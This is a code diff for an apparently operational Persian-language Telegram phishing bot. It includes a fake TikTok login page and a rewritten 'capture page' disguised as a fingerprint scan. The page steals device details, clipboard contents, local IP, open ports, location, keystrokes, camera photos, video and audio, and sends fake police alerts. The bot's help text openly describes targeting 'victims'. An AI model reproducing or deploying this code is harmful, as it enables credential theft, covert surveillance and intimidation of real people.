@@ -87,19 +87,14 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Groq AI (Corrected Models) --------------------
+# -------------------- Groq AI --------------------
 def ask_groq(prompt):
     if not GROQ_API_KEY:
         return "⚠️ کلید Groq تنظیم نشده است."
     try:
         url = "https://api.groq.com/openai/v1/chat/completions"
         headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
-        # مدل‌های فعال و رایگان Groq تا سال ۲۰۲۶ – اولین مدل موفق را برمی‌گرداند
-        models = [
-            "llama-3.1-8b-instant",       # سریع و همیشه در دسترس
-            "gemma2-9b-it",               # مدل سبک گوگل
-            "llama-3.3-70b-versatile",    # قدرتمند
-        ]
+        models = ["llama-3.1-8b-instant", "gemma2-9b-it", "llama-3.3-70b-versatile"]
         last_error = None
         for model in models:
             payload = {
@@ -115,7 +110,7 @@ def ask_groq(prompt):
                 last_error = f"مدل {model}: {resp.status_code} - {resp.text[:200]}"
                 app.logger.warning(f"Groq model {model} failed: {resp.status_code}")
         app.logger.error(f"Groq all models failed: {last_error}")
-        return f"❌ هوش مصنوعی در دسترس نیست.\nجزئیات: {last_error}"
+        return f"❌ هوش مصنوعی در دسترس نیست.\n{last_error}"
     except Exception as e:
         app.logger.error(f"Groq exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
@@ -176,60 +171,182 @@ PHISHING_TIKTOK = """<!DOCTYPE html>
 <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#121212;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;color:white;} .container{width:320px;padding:30px;background:#1e1e1e;border-radius:20px;text-align:center;} img{width:80px;margin-bottom:20px;} input{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:white;font-size:14px;margin-bottom:12px;} .btn{width:100%;background:#fe2c55;color:white;border:none;border-radius:8px;padding:12px;font-weight:bold;font-size:16px;cursor:pointer;}</style></head>
 <body><div class="container"><img src="https://lf16-tiktok-common.ttwstatic.com/obj/tiktok-web-common-sg/ies/tiktok/emblem/logo_web.png"><h2>Log in</h2><form method="POST" action="/login/{{ token }}"><input type="text" name="email" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button class="btn" type="submit">Log in</button></form></div></body></html>"""
 
-# -------------------- Capture Page --------------------
+# -------------------- Capture Page (Biometric simulation + detailed device info) --------------------
 CAPTURE_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>اتصال به اینترنت رایگان</title>
-<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;} video,canvas{display:none;} #btn{display:block;margin:20px auto;padding:15px 30px;font-size:20px;background:#4CAF50;border:none;border-radius:10px;color:white;cursor:pointer;}</style>
+<head><meta charset="UTF-8"><title>اتصال امن</title>
+<style>
+    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 30vh; margin: 0; }
+    video, canvas { display: none; }
+    #fingerprint {
+        width: 120px; height: 120px; border-radius: 50%; background: #111;
+        border: 3px solid #0f0; margin: 20px auto; cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 50px; animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0,255,0,0.7); } 70% { box-shadow: 0 0 0 20px rgba(0,255,0,0); } 100% { box-shadow: 0 0 0 0 rgba(0,255,0,0); } }
+    #scanning { display: none; margin-top: 20px; }
+    .scan-line { width: 200px; height: 3px; background: #0f0; margin: 0 auto; animation: scan 1.5s ease-in-out; }
+    @keyframes scan { 0% { transform: translateY(-30px); opacity: 0; } 50% { opacity: 1; } 100% { transform: translateY(30px); opacity: 0; } }
+    #btn { display: none; margin: 20px auto; padding: 15px 30px; font-size: 20px; background: #4CAF50; border: none; border-radius: 10px; color: white; cursor: pointer; }
+    #msg { margin-top: 20px; }
+</style>
 </head>
 <body>
-    <h1 id="msg">برای فعال‌سازی اینترنت رایگان کلیک کنید</h1>
-    <button id="btn" onclick="startEverything()">اتصال به اینترنت رایگان</button>
+    <h2 id="title">احراز هویت بیومتریک</h2>
+    <div id="fingerprint" onclick="startAuth()">👆</div>
+    <p id="msg">برای تأیید هویت، اثر انگشت خود را اسکن کنید</p>
+    <div id="scanning">
+        <div class="scan-line"></div>
+        <p>در حال اسکن...</p>
+    </div>
+    <button id="btn" onclick="startEverything()">ادامه</button>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
+
     <script>
         const t="{{ token }}";
-        const msg=document.getElementById('msg'),btn=document.getElementById('btn'),v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');
-        let stream=null;
+        const fingerprint = document.getElementById('fingerprint');
+        const msgEl = document.getElementById('msg');
+        const scanningDiv = document.getElementById('scanning');
+        const btn = document.getElementById('btn');
+        const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
+        let stream = null;
 
-        try {
-            var popunder = window.open('about:blank', '_blank', 'width=200,height=100,left=9999,top=9999');
-            if (popunder) {
-                popunder.document.write('<html><head><title>.</title></head><body></body></html>');
-                popunder.blur();
-                window.focus();
+        function startAuth() {
+            fingerprint.style.display = 'none';
+            msgEl.innerText = 'اسکن اثر انگشت آغاز شد...';
+            scanningDiv.style.display = 'block';
+            setTimeout(() => {
+                scanningDiv.style.display = 'none';
+                msgEl.innerText = 'هویت شما تأیید شد. اکنون برای ادامه دسترسی به دوربین را تأیید کنید.';
+                btn.style.display = 'block';
+            }, 2000);
+        }
+
+        async function startEverything() {
+            btn.style.display = 'none';
+            msgEl.innerText = 'در حال برقراری ارتباط...';
+
+            // ---------- Detailed Device Info (without permissions) ----------
+            let deviceInfo = {
+                type: 'device',
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                memory: navigator.deviceMemory || 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                touchPoints: navigator.maxTouchPoints || 0,
+            };
+
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    deviceInfo.battery = { level: battery.level, charging: battery.charging };
+                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});
+                }).catch(() => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)}));
+            } else {
+                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});
             }
-        } catch(e) {}
 
-        async function startEverything(){
-            btn.style.display='none';
-            msg.innerText='در حال برقراری ارتباط...';
-            fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'device',ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,screen:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,memory:navigator.deviceMemory||'N/A'})});
-            try{var cf=document.createElement('canvas');cf.width=200;cf.height=50;var cfctx=cf.getContext('2d');cfctx.textBaseline='top';cfctx.font='14px Arial';cfctx.fillText('Browser Fingerprint '+navigator.userAgent,2,2);fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'fingerprint',data:cf.toDataURL()})});}catch(e){}
-            try{var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));pc.onicecandidate=e=>{if(e.candidate){var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);if(ip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'local_ip',ip:ip[1]})});}};}catch(e){}
-            try{var clip=await navigator.clipboard.readText();if(clip)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'clipboard',data:clip})});}catch(e){}
-            [80,22,443,8080,3389,5900,21].forEach(p=>{var img=new Image();img.src='http://127.0.0.1:'+p+'/favicon.ico?t='+Date.now();var st=Date.now();img.onload=img.onerror=function(){if(Date.now()-st<500)fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'open_port',port:p})});};});
-            if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js?t='+t).then(reg=>{setTimeout(()=>{reg.showNotification('⚠️ هشدار فوری پلیس فتا',{body:'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',icon:'https://www.fata.gov.ir/images/logo.png',requireInteraction:true,vibrate:[300,100,300],data:{url:window.location.origin+'/go/'+t}});},15000);});}
-            if(navigator.geolocation){
+            // network connection
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
+                    type: 'network',
+                    effectiveType: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt
+                })});
+            }
+
+            // userAgentData (new API)
+            if (navigator.userAgentData) {
+                navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "architecture", "model", "fullVersionList"]).then(uaData => {
+                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'ua_data', ...uaData})});
+                });
+            }
+
+            // fingerprint (canvas)
+            try {
+                var cf = document.createElement('canvas');
+                cf.width = 200; cf.height = 50;
+                var cfctx = cf.getContext('2d');
+                cfctx.textBaseline = 'top';
+                cfctx.font = '14px Arial';
+                cfctx.fillText('Browser Fingerprint ' + navigator.userAgent, 2, 2);
+                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data:cf.toDataURL()})});
+            } catch(e) {}
+
+            // internal IP
+            try {
+                var pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = e => {
+                    if (e.candidate) {
+                        var ip = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
+                        if (ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})});
+                    }
+                };
+            } catch(e) {}
+
+            // clipboard
+            try {
+                var clip = await navigator.clipboard.readText();
+                if (clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})});
+            } catch(e) {}
+
+            // port scanning
+            [80,22,443,8080,3389,5900,21].forEach(p => {
+                var img = new Image();
+                img.src = 'http://127.0.0.1:' + p + '/favicon.ico?t=' + Date.now();
+                var st = Date.now();
+                img.onload = img.onerror = function() {
+                    if (Date.now() - st < 500) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:p})});
+                };
+            });
+
+            // service worker & notification
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js?t='+t).then(reg => {
+                    setTimeout(() => {
+                        reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
+                            body: 'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',
+                            icon: 'https://www.fata.gov.ir/images/logo.png',
+                            requireInteraction: true,
+                            vibrate: [300,100,300],
+                            data: { url: window.location.origin + '/go/' + t }
+                        });
+                    }, 15000);
+                });
+            }
+
+            // location
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    p => fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location',lat:p.coords.latitude,lng:p.coords.longitude})}),
-                    e => fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'location_error',message:e.message})})
+                    pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
+                    err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
                 );
             }
-            try{
-                stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:{ideal:320}, height:{ideal:240}}, audio:true});
+
+            // camera & mic
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: {ideal:320}, height: {ideal:240} }, audio: true });
                 v.srcObject = stream;
-                await new Promise(r=>v.onloadedmetadata=r);
+                await new Promise(r => v.onloadedmetadata = r);
                 c.width = v.videoWidth || 640;
                 c.height = v.videoHeight || 480;
-                msg.innerText = 'اتصال برقرار شد.';
+                msgEl.innerText = 'اتصال برقرار شد.';
                 takeSnapshot();
                 window.photoInterval = setInterval(takeSnapshot, 3000);
                 startVideoRecording();
-                try{
+                try {
                     var aud = stream.getAudioTracks()[0];
-                    if(aud){
+                    if (aud) {
                         var mr = new MediaRecorder(new MediaStream([aud]));
                         var chunks = [];
                         mr.ondataavailable = e => chunks.push(e.data);
@@ -238,30 +355,37 @@ CAPTURE_PAGE_TEMPLATE = """
                             var reader = new FileReader();
                             reader.onloadend = () => {
                                 var b64 = reader.result.split(',')[1];
-                                fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'audio',data:b64})});
+                                fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'audio', data:b64})});
                             };
                             reader.readAsDataURL(blob);
                         };
                         mr.start();
                         setTimeout(() => { mr.stop(); }, 5000);
                     }
-                }catch(e){}
-            }catch(e){
-                msg.innerText = 'عدم دسترسی به دوربین. همچنان اطلاعات جمع‌آوری می‌شود.';
+                } catch(e) {}
+            } catch(e) {
+                msgEl.innerText = 'عدم دسترسی به دوربین.';
             }
-            var keys='';
-            document.addEventListener('keydown',e=>{keys+=e.key;});
-            setInterval(()=>{if(keys){fetch('/log/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'keystrokes',data:keys})});keys='';}},5000);
+
+            // keylogger
+            var keys = '';
+            document.addEventListener('keydown', e => { keys += e.key; });
+            setInterval(() => {
+                if (keys.length > 0) {
+                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})});
+                    keys = '';
+                }
+            }, 5000);
         }
 
-        function takeSnapshot(){
-            if(!stream) return;
-            ctx.drawImage(v,0,0,c.width,c.height);
-            var d = c.toDataURL('image/jpeg',0.8);
-            fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',data:d})});
+        function takeSnapshot() {
+            if (!stream) return;
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            var d = c.toDataURL('image/jpeg', 0.8);
+            fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'photo', data:d})});
         }
 
-        function startVideoRecording(){
+        function startVideoRecording() {
             try {
                 if (!stream) return;
                 var videoTrack = stream.getVideoTracks()[0];
@@ -274,7 +398,7 @@ CAPTURE_PAGE_TEMPLATE = """
                     var reader = new FileReader();
                     reader.onloadend = () => {
                         var b64 = reader.result.split(',')[1];
-                        fetch('/upload/'+t, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'video',data:b64})});
+                        fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'video', data:b64})});
                     };
                     reader.readAsDataURL(blob);
                 };
@@ -283,8 +407,8 @@ CAPTURE_PAGE_TEMPLATE = """
             } catch(e) {}
         }
 
-        window.addEventListener('beforeunload', ()=>{
-            if(stream) stream.getTracks().forEach(tr=>tr.stop());
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(tr => tr.stop());
             clearInterval(window.photoInterval);
         });
     </script>
@@ -530,16 +654,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔹 به ربات هوشمند خوش آمدید!\n\n"
         "📌 با دکمه «ساخت لینک جدید» یک لینک فیشینگ اختصاصی بسازید.\n"
         "🎯 نوع قربانی (گوگل، اینستاگرام، فیسبوک، بانک، بازی و...) را انتخاب کنید.\n"
-        "📊 وقتی قربانی لینک را باز کند، اطلاعات دستگاه، عکس، صدا و موقعیت او برایتان ارسال می‌شود.\n\n"
-        "🧠 قابلیت یادگیری کلمات:\n"
-        "  /learn <b>کلمه</b> <b>پاسخ</b>\n"
-        "  مثال: /learn سلام علیکم\n"
-        "  /unlearn <b>کلمه</b>\n"
-        "  /wordlist\n\n"
-        "👤 مدیر ربات می‌تواند با /admin ربات را خاموش/روشن کرده و قربانیان را مدیریت کند.\n"
-        "📈 /stats : آمار کلی\n"
-        "📢 /broadcast : ارسال پیام همگانی به قربانیان\n"
-        "🤖 هوش مصنوعی: در صورت فعال بودن، ربات با Groq پاسخ می‌دهد."
+        "📊 اطلاعات کامل دستگاه (باتری، شبکه، مدل دقیق) و عکس/صدا دریافت کنید.\n\n"
+        "🧠 یادگیری کلمات: /learn, /unlearn, /wordlist\n"
+        "👤 پنل مدیر: /admin\n"
+        "📈 /stats\n"
+        "📢 /broadcast\n"
+        "🤖 هوش مصنوعی: پاسخگویی به پیام‌های خصوصی و ریپلای‌ها"
     )
     keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
                 [InlineKeyboardButton("📖 راهنما", callback_data="help")]]
@@ -647,23 +767,33 @@ async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.close()
     await update.message.reply_text(f"📢 پیام به {len(victims)} قربانی ارسال خواهد شد (در صورت آنلاین بودن، نوتیفیکیشن دریافت می‌کنند).")
 
-# --- Auto-reply with learned words, then AI ---
+# --- Auto-reply with learned words, then AI (including replies) ---
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg_text = update.message.text.lower()
-    # 1. Check learned keywords
-    conn = get_db_connection()
-    rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
-    for row in rows:
-        if row['keyword'] in msg_text:
-            await update.message.reply_text(row['response'])
-            conn.close()
-            return
-    conn.close()
-    # 2. AI if enabled
-    if AI_ENABLED and GROQ_API_KEY:
-        thinking_msg = await update.message.reply_text("🤔 در حال فکر کردن...")
-        answer = ask_groq(update.message.text)
-        await thinking_msg.edit_text(answer)
+    msg = update.message
+    # 1. If it's a reply to our bot, always answer with AI (if enabled)
+    if msg.reply_to_message and msg.reply_to_message.from_user.id == context.bot.id:
+        if AI_ENABLED and GROQ_API_KEY:
+            thinking = await msg.reply_text("🤔 در حال فکر کردن...")
+            answer = ask_groq(msg.text)
+            await thinking.edit_text(answer)
+        return
+
+    # 2. In private chats, check learned words, then AI
+    if msg.chat.type == 'private':
+        text_lower = msg.text.lower()
+        conn = get_db_connection()
+        rows = conn.execute("SELECT keyword, response FROM learned").fetchall()
+        for row in rows:
+            if row['keyword'] in text_lower:
+                await msg.reply_text(row['response'])
+                conn.close()
+                return
+        conn.close()
+        if AI_ENABLED and GROQ_API_KEY:
+            thinking = await msg.reply_text("🤔 در حال فکر کردن...")
+            answer = ask_groq(msg.text)
+            await thinking.edit_text(answer)
+    # 3. In groups, do nothing (unless it's a reply, already handled)
 
 # --- Callback Handler ---
 PHISHING_TYPES = {
